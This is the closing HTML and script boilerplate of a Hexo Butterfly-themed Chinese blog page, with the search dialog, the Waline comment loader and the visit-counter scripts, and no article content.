id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function insertCSS () {
+    const link = document.createElement("link")
+    link.rel = "stylesheet"
+    link.href = "https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css"
+    document.head.appendChild(link)
+  }
+
+  function initWaline () {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'comments.jenchoi.tk',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: true,
+    }, null))
+  }
+
+  if (typeof Waline === 'function') initWaline()
+  else {
+    insertCSS()
+    getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js').then(initWaline)
+  }
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
